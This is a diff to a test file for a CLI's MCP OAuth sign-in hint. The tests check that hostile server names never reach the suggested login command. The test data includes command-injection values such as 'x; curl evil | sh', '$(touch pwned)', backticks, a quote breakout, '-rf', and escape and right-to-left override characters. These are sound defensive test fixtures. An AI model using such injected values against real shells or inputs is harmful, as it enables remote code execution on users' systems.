@@ -304,19 +304,15 @@ describe('/mcp and OAuth sign-in', () => {
   });
 
   it.each([
-    ['x; curl evil | sh', "robota mcp login 'x; curl evil | sh')"],
-    ['x$(touch pwned)', "robota mcp login 'x$(touch pwned)')"],
-    ['x`touch pwned`', "robota mcp login 'x`touch pwned`')"],
-    ["it's", "robota mcp login 'it'\\''s')"],
-  ])('quotes a hostile server name %j in the sign-in command', async (name, command) => {
-    const result = await executeMCPActivationCommand(context(withServer(name)), 'status');
-    expect(result.message).toContain(command);
-  });
-
-  it.each([
+    ['a command separator', 'x; curl evil | sh'],
+    ['a command substitution', 'x$(touch pwned)'],
+    ['backticks', 'x`touch pwned`'],
+    ['a backslash-quote', "\\';touch pwned;#"],
+    ['a leading dash', '-rf'],
+    ['a leading equals sign', '=cmd'],
     ['a newline', 'x\nrobota mcp login good'],
     ['an escape sequence', 'x\u001b[2Kgood'],
-    ['a right-to-left override', 'x\u202egood'],
+    ['a right-to-left override', 'x‮good'],
   ])('never puts a name with %s into the sign-in command', async (_what, name) => {
     const result = await executeMCPActivationCommand(context(withServer(name)), 'status');
     const hint = /\(run robota mcp login [^)]*\)/.exec(result.message)?.[0];
